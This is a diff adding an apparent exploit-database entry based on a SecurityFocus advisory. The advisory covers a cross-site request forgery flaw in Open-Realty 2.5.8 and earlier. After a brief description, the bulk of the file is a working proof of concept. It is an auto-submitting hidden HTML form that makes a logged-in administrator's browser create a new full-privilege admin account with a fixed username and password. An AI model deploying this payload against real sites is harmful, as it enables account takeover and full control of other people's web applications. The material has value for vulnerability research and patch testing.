@@ -1,0 +1,61 @@
+source: http://www.securityfocus.com/bid/56580/info
+
+Open-Realty is prone to a cross-site request-forgery vulnerability.
+
+Exploiting this issue may allow a remote attacker to perform certain unauthorized administrative actions and gain access to the affected application. Other attacks are also possible.
+
+Open-Realty 2.5.8 and prior versions are vulnerable; other versions may also be affected. 
+
+<!-- Add Admin User --> 
+ <form 
+action="http://localhost/orealty/admin/index.php?action=user_manager" 
+method="POST">
+      <input type="hidden" name="action" value="createNewUser" />
+      <input type="hidden" name="edit&#95;user&#95;name" value="user" />
+      <input type="hidden" name="edit&#95;user&#95;pass" 
+value="pa55w0rd" />
+      <input type="hidden" name="edit&#95;user&#95;pass2" 
+value="pa55w0rd" />
+      <input type="hidden" name="user&#95;first&#95;name" value="hacker" 
+/>
+      <input type="hidden" name="user&#95;last&#95;name" value="smith" 
+/>
+      <input type="hidden" name="user&#95;email" 
+value="hacker&#64;yehg&#46;net" />
+      <input type="hidden" name="edit&#95;active" value="yes" />
+      <input type="hidden" name="edit&#95;isAdmin" value="yes" />
+      <input type="hidden" name="edit&#95;isAgent" value="yes" />
+      <input type="hidden" name="limitListings" value="&#45;1" />
+      <input type="hidden" name="edit&#95;limitFeaturedListings" 
+value="&#45;1" />
+      <input type="hidden" name="edit&#95;userRank" value="0" />
+      <input type="hidden" name="edit&#95;canEditAllListings" 
+value="yes" />
+      <input type="hidden" name="edit&#95;canEditAllUsers" value="yes" 
+/>
+      <input type="hidden" name="edit&#95;canEditSiteConfig" value="yes" 
+/>
+      <input type="hidden" name="edit&#95;canEditMemberTemplate" 
+value="yes" />
+      <input type="hidden" name="edit&#95;canEditAgentTemplate" 
+value="yes" />
+      <input type="hidden" name="edit&#95;canEditPropertyClasses" 
+value="yes" />
+      <input type="hidden" name="edit&#95;canEditListingTemplate" 
+value="yes" />
+      <input type="hidden" name="edit&#95;canViewLogs" value="yes" />
+      <input type="hidden" name="edit&#95;canModerate" value="yes" />
+      <input type="hidden" name="edit&#95;canFeatureListings" 
+value="yes" />
+      <input type="hidden" name="edit&#95;canEditListingExpiration" 
+value="yes" />
+      <input type="hidden" name="edit&#95;canExportListings" value="no" 
+/>
+      <input type="hidden" name="edit&#95;canPages" value="yes" />
+      <input type="hidden" name="edit&#95;canVtour" value="yes" />
+      <input type="hidden" name="edit&#95;canFiles" value="yes" />
+      <input type="hidden" name="edit&#95;canUserFiles" value="yes" />
+      <input type="hidden" name="edit&#95;canManageAddons" value="yes" 
+/>
+      <script>document.forms[0].submit()</script>
+    </form>
